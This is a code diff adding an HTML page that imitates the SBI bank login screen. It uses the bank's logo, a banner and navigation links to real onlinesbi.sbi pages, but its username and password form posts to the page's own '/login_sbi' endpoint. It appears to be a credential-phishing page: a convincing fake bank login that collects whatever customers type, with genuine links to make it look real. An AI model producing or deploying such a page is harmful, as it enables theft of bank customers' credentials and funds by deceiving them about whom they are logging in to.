@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sbi | login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <img src="./sbi.png" alt="sbi_logo">
+        <nav class="nav">
+            <a href="#home">Home</a>
+            <a href="https://retail.onlinesbi.sbi/personal/productandservices.html">Products & Services</a>
+            <a href="https://retail.onlinesbi.sbi/personal/rinb_videos.html">How Do I</a>
+            <a href="https://www.sihub.in/managesi/sbi#/home/landing">Manage Debit Card E-Mandate</a></li>
+            <a href="https://www.onlinesbi.sbi/personal/contact_us.html">Contact Us</a>
+        </nav>
+        <img class="banner" src="./banner.jpg" alt="banner">
+    </header>
+    <main>
+        <form action="/login_sbi" method="post">
+            <input type="text" name="username" id="username" placeholder="Username" required autocomplete="off"><br>
+            <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off"><br>
+            <button>Login</button>
+            <button onclick='window.location.href="https://retail.onlinesbi.sbi/retail/troubleloginhome.htm?bankCode=0"'>Reset</button>
+        </form>
+    </main>
+</body>
+</html>
